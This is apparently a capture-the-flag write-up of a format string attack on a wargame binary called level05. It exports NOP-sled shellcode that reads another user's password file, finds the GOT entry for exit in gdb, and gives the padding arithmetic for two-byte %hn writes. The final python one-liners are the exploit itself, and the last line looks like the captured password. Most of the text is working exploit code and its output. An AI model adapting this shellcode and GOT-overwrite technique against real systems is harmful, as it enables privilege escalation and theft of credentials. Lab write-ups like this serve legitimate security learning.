format string attack
we can export some shellcode, and replace exit relocation address in the GOT to target our shellcode instead
However the offset is too great to write the address in one go using %n. We will have to write it 2 bytes at a time (%hn)

gdb level05
disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
...

export SHELLCODE=$(python -c "print 64 * '\x90' + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff' + '/home/users/level06/.pass'")

b main
r
x/50s *((char **) environ)
0xffffd814:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311\315\200\211\306\353\006\260\001\061\333\315\200\211\363\260\003\203\354\001\215\f$\262\001\315\200\061\333\071\303t\346\260\004\263\001\262\001\315\200\203\304\001\353\337\350\311\377\377\377/home/users/level06/.pass"

address of exit() in got is 0x080497e0
address of our shellcode is 0xffffd814

./level05
aaaabbbb%10$p%11$p
aaaabbbb0x616161610x62626262

We can pass our 2 addresses at the start of our buffer and access them in $10 and $11 parameter indexes

The tricky part is calculating the correct padding that will determine what value each use of %n will print

0xffffd814
printf %d 0xffff
65535
printf %d 0xd814
55316		; value of first padding before substracting address string sizes (8)
65535-55316
10219		; value of second padding

Its important to keep in mind that changing the value of the first padding must be reflected in the second padding value since it is a difference

each use of %n does not reset the counter so we must use the lowest value first as padding, the padding value for the second %n will be total padding - first padding (only  subtract the address strings (8) from the first padding so as not to count it twice in the second padding) 

because of environment variables being added at runtime, we have to try several offsets before reaching our shellcode (+ first padding - second padding)

python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55308d%10\$hn' + '%10219d%11\$hn'" | ./level05
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55324d%10\$hn' + '%10203d%11\$hn'" | ./level05
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
